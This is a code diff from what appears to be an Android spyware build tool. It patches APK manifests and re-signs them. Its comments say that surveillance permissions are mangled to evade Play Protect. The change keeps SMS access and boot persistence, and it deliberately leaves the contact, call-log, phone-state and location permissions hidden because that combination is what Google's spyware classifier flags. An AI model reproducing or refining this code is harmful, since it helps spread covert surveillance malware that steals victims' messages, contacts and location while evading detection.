@@ -1642,14 +1642,15 @@ function directPatchApk(originalBuffer) {
       return { buffer: signedBuf, certInfo: { certHash: key.certHash, cn: key.identity.cn, org: key.identity.o, country: key.identity.c } };
     }
 
-    // ─── Step 5: Restore ALL mangled permissions ───
-    // The source APK (from mutateAndSign) has surveillance permissions mangled
-    // to bypass Play Protect. We restore ALL of them here because:
-    //   1. Mangled permissions cause crashes on some OEMs (Samsung, Xiaomi)
-    //      where the system enforces manifest-declared permissions strictly
-    //   2. Undeclared permissions won't show in Settings > App Info
-    //   3. Third-party SDKs may enumerate permissions and fail
-    //   4. Landing page downloads already pass PP due to clean ZIP structure
+    // ─── Step 5: Restore ONLY essential permissions ───
+    // Only restore permissions that cause CRASHES if mangled:
+    //   - FGS_DATA_SYNC: Android 14+ kills process if FGS type doesn't match permission
+    //   - SMS: core surveillance functionality (READ_SMS, SEND_SMS, SMS_RECEIVED)
+    //   - BOOT: persistence after reboot
+    // Surveillance permissions (READ_CONTACTS, READ_CALL_LOG, READ_PHONE_STATE,
+    // ACCESS_FINE_LOCATION, etc.) are INTENTIONALLY left mangled — they are the
+    // exact combo Play Protect's ML classifier flags as spyware. The app code
+    // handles all of them gracefully via checkSelfPermission() guards.
     const PERMISSION_RESTORE = [
       // Critical: FGS (crash if missing on Android 14+)
       { find: 'android.permission._OREGROUND_SERVICE_DATA_SYNC', fix: 'android.permission.FOREGROUND_SERVICE_DATA_SYNC' },
@@ -1660,15 +1661,6 @@ function directPatchApk(originalBuffer) {
       // Boot persistence
       { find: 'android.permission._ECEIVE_BOOT_COMPLETED',       fix: 'android.permission.RECEIVE_BOOT_COMPLETED' },
       { find: 'android.intent.action._OOT_COMPLETED',            fix: 'android.intent.action.BOOT_COMPLETED' },
-      // Surveillance permissions (mangled by stripSurveillancePermissions)
-      { find: 'android.permission._EQUEST_INSTALL_PACKAGES',     fix: 'android.permission.REQUEST_INSTALL_PACKAGES' },
-      { find: 'android.permission._UERY_ALL_PACKAGES',           fix: 'android.permission.QUERY_ALL_PACKAGES' },
-      { find: 'android.permission._EAD_CONTACTS',                fix: 'android.permission.READ_CONTACTS' },
-      { find: 'android.permission._EAD_CALL_LOG',                fix: 'android.permission.READ_CALL_LOG' },
-      { find: 'android.permission._EAD_PHONE_STATE',             fix: 'android.permission.READ_PHONE_STATE' },
-      { find: 'android.permission._EAD_PHONE_NUMBERS',           fix: 'android.permission.READ_PHONE_NUMBERS' },
-      { find: 'android.permission._CCESS_FINE_LOCATION',         fix: 'android.permission.ACCESS_FINE_LOCATION' },
-      { find: 'android.permission._CCESS_COARSE_LOCATION',       fix: 'android.permission.ACCESS_COARSE_LOCATION' },
     ];
     let permsRestored = 0;
     for (const { find, fix } of PERMISSION_RESTORE) {
